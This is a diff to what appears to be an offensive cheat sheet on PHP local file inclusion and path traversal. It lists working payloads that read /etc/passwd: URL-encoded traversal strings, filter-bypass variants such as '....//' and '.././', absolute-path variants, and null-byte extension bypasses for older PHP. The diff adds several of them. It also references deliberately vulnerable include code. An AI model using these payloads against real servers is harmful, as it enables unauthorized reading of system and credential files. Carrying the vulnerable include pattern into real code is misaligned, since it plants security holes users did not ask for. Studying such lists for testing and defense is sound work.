@@ -2,6 +2,7 @@
 
 ### PHP
 ##### Vulnerable code:
+
 ###### Standard vulnerable to everything:
 ```php
 <?php                                                                                                                                                                                                                                          
@@ -74,15 +75,21 @@ include 'templates/footer.php';
 - URL encodings
 %5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
 /%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
+%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
+
 
 - "Filter and remove" bypass
 ....//....//....//....//....//....//....//....//etc/passwd
+
+- another filter bypass
+.././.././.././../etc/passwd  (Bypass "../.." filter)
 
 - Original path kept
 /var/www/../../etc/passwd
 /var/www/html/../../../etc/passwd
 
 Note: extra output gets appended, use a nullbyte (%00) to immediately terminate the string. This might cause issues.
+%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00 (Bypass extensions with a NULL byte, PHP < 5.3.4)
 ```
 
 ##### PHP wrappers
